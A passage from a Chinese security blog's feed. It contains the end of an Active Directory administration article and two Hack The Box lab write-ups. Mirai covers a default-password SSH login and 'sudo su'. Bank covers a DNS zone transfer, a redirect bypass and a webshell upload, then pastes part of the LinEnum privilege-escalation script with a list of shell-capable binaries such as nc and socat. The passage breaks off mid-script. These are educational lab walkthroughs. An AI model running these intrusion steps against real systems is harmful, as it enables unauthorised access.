title="组策略的存储"></a>组策略的存储</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113619.png-water_print" alt=""></p><h1 id="域的信任关系"><a href="#域的信任关系" class="headerlink" title="域的信任关系"></a>域的信任关系</h1><h2 id="信任关系的概念"><a href="#信任关系的概念" class="headerlink" title="信任关系的概念"></a>信任关系的概念</h2><ul><li>域是安全边界，如果域之间没有信任关系，每个域中的用户只能访问本域内的资源</li><li>信任关系在两个域之间架起了一座桥梁(信任路径)，使得域用户帐户可以跨域使用，实现了跨域的身份验证和资源访问</li><li>信任关系常用的场景包括公司并购、外部合作、活动目录迁徙等</li><li>根据域类型的不同，有些域之间的信任关系默认存在，有些则需要手工创建<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113628.png-water_print" alt=""></li></ul><h3 id="信任关系的方向性"><a href="#信任关系的方向性" class="headerlink" title="信任关系的方向性"></a>信任关系的方向性</h3><ul><li><p>A 域单向信任 B 域</p><ul><li>A 域中的资源可以被 B 域访问<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113648.png-water_print" alt=""></li></ul></li><li><p>A 域和 B 域双向信任</p><ul><li>A 域中的资源可以被 B 域访问</li><li>B 域中的资源可以被 A 域访问<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113656.png-water_print" alt=""></li></ul></li></ul><h3 id="信任关系的传递性"><a href="#信任关系的传递性" class="headerlink" title="信任关系的传递性"></a>信任关系的传递性</h3><ul><li>信任关系如果是可传递的，则多个可传递的信任关系可以自动串接</li><li>信任关系如果是不可传递的，则信任链断裂，无法完成信任关系自动串接<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113709.png-water_print" alt=""></li></ul><h3 id="林内的信任关系"><a href="#林内的信任关系" class="headerlink" title="林内的信任关系"></a>林内的信任关系</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113717.png-water_print" alt=""></p><h3 id="林间的信任关系"><a href="#林间的信任关系" class="headerlink" title="林间的信任关系"></a>林间的信任关系</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113725.png-water_print" alt=""></p><h3 id="快捷信任"><a href="#快捷信任" class="headerlink" title="快捷信任"></a>快捷信任</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113734.png-water_print" alt=""></p><h3 id="信任关系总结"><a href="#信任关系总结" class="headerlink" title="信任关系总结"></a>信任关系总结</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113743.png-water_print" alt=""></p><h2 id="信任关系的配置"><a href="#信任关系的配置" class="headerlink" title="信任关系的配置"></a>信任关系的配置</h2><h3 id="林内的信任关系-1"><a href="#林内的信任关系-1" class="headerlink" title="林内的信任关系"></a>林内的信任关系</h3><p>父子信任，树根信任均为默认存在，无需手工创建</p><h3 id="林间的信任关系-1"><a href="#林间的信任关系-1" class="headerlink" title="林间的信任关系"></a>林间的信任关系</h3><ul><li>森林信任或外部信任需手工创建，配置可以是单向或双向</li><li>本域需要 DNS 查询能够得到对方域控制器的 SRV 记录(条件转发或辅助区域同步)</li><li>「信任方」和「被信任方」两边分别配置信任的「内向」和「外向」<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113752.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113802.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113810.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113819.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113826.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113832.png-water_print" alt=""></li></ul><h3 id="信任的安全增强"><a href="#信任的安全增强" class="headerlink" title="信任的安全增强"></a>信任的安全增强</h3><ul><li>选择性身份认证</li><li>名称后缀路由</li></ul><h1 id="操作主机-FSMO"><a href="#操作主机-FSMO" class="headerlink" title="操作主机 FSMO"></a>操作主机 FSMO</h1><h2 id="操作主机概述"><a href="#操作主机概述" class="headerlink" title="操作主机概述"></a>操作主机概述</h2><ul><li>域控制器之间需要同步 AD 的数据库<ul><li>大部分的数据同步采用<code>多主机复制机制</code></li><li>少部分的数据同步采用<code>单主机复制机制</code></li></ul></li><li>操作主机即用于这类特殊的单主机复制，以满足特殊场景下更高效可控的数据同步<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113841.png-water_print" alt=""></li></ul><h3 id="操作主机的角色"><a href="#操作主机的角色" class="headerlink" title="操作主机的角色"></a>操作主机的角色</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113849.png-water_print" alt=""><br>默认第一台安装的域控制器承担了所有的角色</p><h3 id="操作主机的作用"><a href="#操作主机的作用" class="headerlink" title="操作主机的作用"></a>操作主机的作用</h3><h4 id="林级别"><a href="#林级别" class="headerlink" title="林级别"></a>林级别</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113857.png-water_print" alt=""></p><h4 id="域级别"><a href="#域级别" class="headerlink" title="域级别"></a>域级别</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113904.png-water_print" alt=""></p><h3 id="操作主机角色的查看"><a href="#操作主机角色的查看" class="headerlink" title="操作主机角色的查看"></a>操作主机角色的查看</h3><ul><li>命令行方式</li></ul><p>查询所有的 FSMO 角色</p><pre class=" language-cmd"><code class="language-cmd">netdom query fsmo</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113915.png-water_print" alt=""></p><ul><li>图形化方式<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113923.png-water_print" alt=""></li></ul><h1 id="站点及活动目录复制"><a href="#站点及活动目录复制" class="headerlink" title="站点及活动目录复制"></a>站点及活动目录复制</h1><h2 id="站点的概念"><a href="#站点的概念" class="headerlink" title="站点的概念"></a>站点的概念</h2><h3 id="域用户登录过程"><a href="#域用户登录过程" class="headerlink" title="域用户登录过程"></a>域用户登录过程</h3><ol><li>PC 终端向 DNS 查询 DC 的 SRV 记录，获取域内所有 DC 的IP</li><li>根据 DNS 中配置的优先级和权重等因素，返回提供服务的 DC 域控制器的 IP</li><li>如果所有 DC 的优先级和权重相同，则返回所有的 DC 的IP，此时会导致 PC 终端所选择的 DC 控制器会具有一定的随机性<br><code>注：</code> 可用 <code>set loginserver</code> 查看当前计算机由哪台 DC 服务</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113941.png-water_print" alt=""></p><h3 id="问题与挑战"><a href="#问题与挑战" class="headerlink" title="问题与挑战"></a>问题与挑战</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113950.png-water_print" alt=""></p><h3 id="站点-Site"><a href="#站点-Site" class="headerlink" title="站点-Site"></a>站点-Site</h3><blockquote><p>站点由 IP 子网构成，站点内的节点可以相互高速通信</p></blockquote><ul><li>默认情况下所有的域控制器都在一个站点中(Default-first-site-name)</li><li>部署多个站点的目的是优化站点间 DC 的复制同步，同时使客户端能够和就近的 DC 优先通信，优化登录验证的操作</li><li>建议根据地理位置和互通带宽的实际情况，定义「域控制器」、「iP子网」、「站点」三者之间的关系</li><li>IP 终端在登录时会自动根据自身 IP 地址在 DNS 中寻找包含本 IP 子网的站点中的 DC 进行登录<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113958.png-water_print" alt=""></li></ul><h2 id="站点内的数据复制"><a href="#站点内的数据复制" class="headerlink" title="站点内的数据复制"></a>站点内的数据复制</h2><ul><li><p>同一站点内多个 DC 之间的复制采用多主机复制模式(multimaster replication)</p></li><li><p>KCC算法(Knowledge Consistency Checker)负责自动计算每台 DC 的复制路径，确保从更新的始发 DC 到最远端的 DC 之间的复制关系不超过 3 跳<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009114007.png-water_print" alt=""></p></li><li><p>当一台 DC 发生数据改变后，默认等待 15 秒后，通知「直接复制伙伴」来获取更新，直接复制伙伴在获取更新后，会以相同的方式通知自己的复制伙伴来获取更新，直到站点内所有的 DC 都获取到该更新</p></li><li><p>当更新数据很重要时(如用户账户锁定，密码变动，策略变动等)，不会等待 15 秒的延迟再发通知，而是用单主复制模式的「紧急通知」的方式，立即通知复制伙伴</p></li><li><p>即使没有数据更新，站点内 DC 也会每隔一定时间进行数据同步(默认 1 小时，可配置调整)，也可随时手工触发立即复制</p></li></ul><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ul><li>站点间 DC 的数据复制机制不会一有变化就立即触发通知，而是按指定频率定时复制(默认小时),且必须在复制计划允许的时间窗口内(比如下班以后);也可在必要时由管理员手工触发立即更新</li><li>每一个站点内都有一台 DC 作为<code>站点间拓扑生成器(ISTG)</code>，负责计算该站点和其他站点之间的最佳复制路径</li><li><code>ITSG</code> 同时指定站点内的一台 DC 为桥头堡服务器(Bridgehead)，负责域间数据复制的出入口跳板。站点内的 DC 将复制更新统一交给 <code>Bridgehead</code>，由其负责和其他站点的 <code>Bridgehead</code> 通信复制站点间数据，再进一步复制给对方站点内的其他 DC。</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009114025.png-water_print" alt=""></p><h3 id="站点链接"><a href="#站点链接" class="headerlink" title="站点链接"></a>站点链接</h3><ul><li>站点和站点之间复制的逻辑通道，建立站点链接需确保 DC 间的 IP 可达</li><li>设置站点链接的开销(Cost)将影响路径的选择，默认的开销为100，越小越优先</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009114033.png-water_print" alt=""></p><h3 id="站点与组策略"><a href="#站点与组策略" class="headerlink" title="站点与组策略"></a>站点与组策略</h3><p>部署站点后可以将组策略的应用范围配置为对站点内对象生效<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009114042.png-water_print" alt=""></p><h3 id="复制的监视和排错"><a href="#复制的监视和排错" class="headerlink" title="复制的监视和排错"></a>复制的监视和排错</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009114051.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域控安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Mirai</title>
      <link href="/2019/09/11/hackthebox-mirai/"/>
      <url>/2019/09/11/hackthebox-mirai/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Mirai"><a href="#Hack-The-Box-——-Mirai" class="headerlink" title="Hack The Box —— Mirai"></a>Hack The Box —— Mirai</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911183033.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class=" language-bash"><code class="language-bash">nmap -T4 -A -v 10.10.10.48</code></pre><p>得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911183449.png-water_print" alt=""><br>服务器开放了 TCP 53、80、22端口。<br>访问 80 端口，为空白页面。</p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><pre class=" language-bash"><code class="language-bash">python3 dirsearch.py -u http://10.10.10.48/ -e html -t 20</code></pre><p>得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911183735.png-water_print" alt=""></p><p>发现 <code>admin</code> 目录。<br>访问，得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911183800.png-water_print" alt=""></p><p>搜索相关信息，发现是一个树莓派上搭建的服务</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试使用树莓派默认密码登录，搜索相关信息，发现树莓派默认密码如下：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911183931.png-water_print" alt=""></p><p>尝试登录：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> pi@10.10.10.48</code></pre><p>发现登录成功：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911184137.png-water_print" alt=""></p><p>直接 <code>cat /home/pi/user.txt</code> 获得第一个 <code>flag</code>。</p><p>利用 <code>sudo -l</code> 命令，查看当前可执行 <code>sudo</code> 的权限：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911184330.png-water_print" alt=""></p><p>发现无需密码可执行 <code>root</code> 的所有命令，直接 <code>sudo su</code> 切换到 <code>root</code> 用户。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911184428.png-water_print" alt=""></p><p>直接 <code>cat /root/root.txt</code> 发现如下信息：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911184521.png-water_print" alt=""></p><p>尝试查看当前系统挂载了哪些设备：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -lh</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911184611.png-water_print" alt=""></p><p>发现 <code>/dev/sdb</code> 设备挂载在 <code>/media/stick</code> 下：</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>直接利用 <code>strings</code> 命令获取设备中的所有字符串：</p><pre><code>strings /dev/sdb</code></pre><p>得到疑似 flag 的字符串，提交后发现正确。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911185044.png-water_print" alt=""></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用 <code>dd</code> 命令提取 <code>usb</code> 镜像:</p><pre class=" language-bash"><code class="language-bash">dcfldd if<span class="token operator">=</span>/dev/sdb of<span class="token operator">=</span>/home/pi/usb.dd​</code></pre><p>然后，分析镜像内容：</p><pre class=" language-bash"><code class="language-bash">binwalk usb.dd​</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911190039.png-water_print" alt=""><br>发现存在三个文件。使用 <code>binwalk</code> 提取文件：</p><pre class=" language-bash"><code class="language-bash">binwalk -Me usb.dd​</code></pre><p>查看原始文件，得到 flag<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190911190205.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Bank</title>
      <link href="/2019/09/09/hackthebox-bank/"/>
      <url>/2019/09/09/hackthebox-bank/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Bank"><a href="#Hack-The-Box-——-Bank" class="headerlink" title="Hack The Box —— Bank"></a>Hack The Box —— Bank</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909204647.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class=" language-bash"><code class="language-bash">nmap -T4 -A -v 10.10.10.29</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909204647.png-water_print" alt="扫描结果"></p><p>发现开放了22、80、TCP 53 端口，在 53 端口上开放 DNS 服务。通常情况下 DNS 服务开放在 UDP 53 端口上，在 TCP 上开放 DNS 服务，一般是具有区域传输功能，因此怀疑具有 DNS 区域传输漏洞。</p><p>访问 80 端口，是一个 apache 的默认页面，通常情况下，这种既开着 DNS 的，然后直接访问 80 端口为空页面的服务器，是作为虚拟主机使用。</p><h3 id="DNS-信息查询"><a href="#DNS-信息查询" class="headerlink" title="DNS 信息查询"></a>DNS 信息查询</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909204714.png-water_print" alt=""><br>首先测试 localhost 与 10.10.10.29，并未发现有价值的信息，然后尝试猜测 <code>bank.htb</code> （看了 WP 才知道），发现该域名能够被 DNS 服务所解析，因此利用 <code>dig</code> 工具进行进一步测试。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">dig</span> axfr bank.htb @10.10.10.29</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909205407.png-water_print" alt=""></p><p>成功利用区域传输漏洞获得 <code>bank.htb</code> 域名的子域名。</p><h2 id="漏洞发掘"><a href="#漏洞发掘" class="headerlink" title="漏洞发掘"></a>漏洞发掘</h2><p>将攻击机的 DNS 服务器设置为 <code>10.10.10.29</code>，然后访问 <code>www.bank.htb</code>，得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909205943.png-water_print" alt=""></p><p>然后利用 <code>dirsearch</code> 工具进行目录爆破：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909210058.png-water_print" alt=""><br>发现上传目录、index.php、support.php，但是<code>index.php</code>、<code>support.php</code>页面大小不同，却直接 302 重定向到login.php，怀疑<code>index.php</code>、<code>support.php</code> 另有玄机。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909210423.png-water_print" alt=""></p><p>利用 <code>burpsuite</code> 的重写 <code>response header</code> 的功能，取消重定向，即将 <code>302</code> 改为 <code>200</code>。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909210428.png-water_print" alt=""></p><p>访问得到<code>index.php</code>、<code>support.php</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909210509.png-water_print" alt=""></p><p><code>support.php</code> 存在上传点，但是经过尝试，并未绕过限制，进而进一步进行测试。</p><p>在目录爆破的过程中，发现了 <code>balance-transfer</code> 目录，访问后得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909210644.png-water_print" alt=""></p><p>随便打开一个文件，发现里面疑似是加密过的日志，因此尝试寻找加密失败的文件，进而获得用户名和密码的明文。</p><p>首先将所有文件下载到本地：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> -r http://www.bank.htb/balance-transfer</code></pre><p>然后进入到 <code>balance-transfer</code> 目录，删除index.html* 等文件，进行大小排序：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">wc</span> -c *.acc <span class="token operator">|</span> <span class="token function">sort</span> -n</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211024.png-water_print" alt=""></p><p>发现一个特别小的文件，访问后得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211047.png-water_print" alt=""></p><p>利用得到的账号和密码登录：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211118.png-water_print" alt=""></p><p>再次发现上传页面，同时，该上传页面利用的是之前的 <code>support.php</code>。</p><p>右键查看当前页面的源代码，发现一处 <code>debug</code> 留下的漏洞：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211331.png-water_print" alt=""></p><p>直接上传webshell，命名为 <code>xxx.htb</code>，菜刀连接：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211433.png-water_print" alt=""></p><p>查看 <code>user.txt</code> 获得第一个 flag。</p><p><code>whoami</code> 查看权限，发现权限不足，尝试提权。</p><p>上传 LinEnum.sh 脚本，并执行，获得一些辅助信息。</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#A script to enumerate local information from a Linux host</span>version<span class="token operator">=</span><span class="token string">"version 0.97"</span><span class="token comment" spellcheck="true">#@rebootuser</span><span class="token comment" spellcheck="true">#help function</span>usage <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> -e <span class="token string">"\n\e[00;31m#########################################################\e[00m"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m#\e[00m"</span> <span class="token string">"\e[00;33mLocal Linux Enumeration &amp; Privilege Escalation Script\e[00m"</span> <span class="token string">"\e[00;31m#\e[00m"</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m#########################################################\e[00m"</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m# <span class="token variable">$version</span>\e[00m\n"</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"</span>        <span class="token keyword">echo</span> <span class="token string">"OPTIONS:"</span>        <span class="token keyword">echo</span> <span class="token string">"-k    Enter keyword"</span>        <span class="token keyword">echo</span> <span class="token string">"-e    Enter export location"</span>        <span class="token keyword">echo</span> <span class="token string">"-s    Supply user password for sudo checks (INSECURE)"</span>        <span class="token keyword">echo</span> <span class="token string">"-t    Include thorough (lengthy) tests"</span>        <span class="token keyword">echo</span> <span class="token string">"-r    Enter report name"</span>         <span class="token keyword">echo</span> <span class="token string">"-h    Displays this help text"</span>        <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>        <span class="token keyword">echo</span> <span class="token string">"Running with no options = limited scans/no output file"</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m#########################################################\e[00m"</span>      <span class="token punctuation">}</span>header<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\n\e[00;31m#########################################################\e[00m"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m#\e[00m"</span> <span class="token string">"\e[00;33mLocal Linux Enumeration &amp; Privilege Escalation Script\e[00m"</span> <span class="token string">"\e[00;31m#\e[00m"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m#########################################################\e[00m"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m# www.rebootuser.com\e[00m"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m# <span class="token variable">$version</span>\e[00m\n"</span> <span class="token punctuation">}</span>debug_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"[-] Debug Info"</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>     <span class="token keyword">echo</span> <span class="token string">"[+] Searching for the keyword <span class="token variable">$keyword</span> in conf, php, ini and log files"</span> <span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$report</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>     <span class="token keyword">echo</span> <span class="token string">"[+] Report name = <span class="token variable">$report</span>"</span> <span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>     <span class="token keyword">echo</span> <span class="token string">"[+] Export location = <span class="token variable">$export</span>"</span> <span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>     <span class="token keyword">echo</span> <span class="token string">"[+] Thorough tests = Enabled"</span> <span class="token keyword">else</span>     <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Thorough tests = Disabled\e[00m"</span> <span class="token keyword">fi</span><span class="token function">sleep</span> 2<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$export</span> 2<span class="token operator">></span>/dev/null  format<span class="token operator">=</span><span class="token variable">$export</span>/LinEnum-export-`date +<span class="token string">"%d-%m-%y"</span>`  <span class="token function">mkdir</span> <span class="token variable">$format</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudopass</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token keyword">echo</span> -e <span class="token string">"\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"</span>  <span class="token function">read</span> -s userpassword  <span class="token keyword">echo</span> <span class="token keyword">fi</span>who<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span> 2<span class="token operator">></span>/dev/null <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33mScan started at:"</span><span class="token punctuation">;</span> <span class="token function">date</span> <span class="token keyword">echo</span> -e <span class="token string">"\e[00m\n"</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true"># useful binaries (thanks to https://gtfobins.github.io/)</span>binarylist<span class="token operator">=</span><span class="token string">'nmap\|perl\|awk\|find\|bash\|sh\|man\|more\|less\|vi\|emacs\|vim\|nc\|netcat\|python\|ruby\|lua\|irb\|tar\|zip\|gdb\|pico\|scp\|git\|rvim\|script\|ash\|csh\|curl\|dash\|ed\|env\|expect\|ftp\|sftp\|node\|php\|rpm\|rpmquery\|socat\|strace\|taskset\|tclsh\|telnet\|tftp\|wget\|wish\|zsh\|ssh$\|ip$\|arp\|mtr'</span>system_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### SYSTEM ##############################################\e[00m"</span> <span class="token comment" spellcheck="true">#basic kernel info</span>unameinfo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -a 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$unameinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Kernel information:\e[00m\n<span class="token variable">$unameinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">fi</span>procver<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /proc/version 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$procver</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Kernel information (continued):\e[00m\n<span class="token variable">$procver</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">fi</span><span class="token comment" spellcheck="true">#search all *-release files for version info</span>release<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/*-release 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$release</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Specific release information:\e[00m\n<span class="token variable">$release</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">fi</span><span class="token comment" spellcheck="true">#target hostname info</span>hostnamed<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">hostname</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$hostnamed</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Hostname:\e[00m\n<span class="token variable">$hostnamed</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">fi</span><span class="token punctuation">}</span>user_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### USER/GROUP ##########################################\e[00m"</span> <span class="token comment" spellcheck="true">#current user details</span>currusr<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">id</span> 2<span class="token 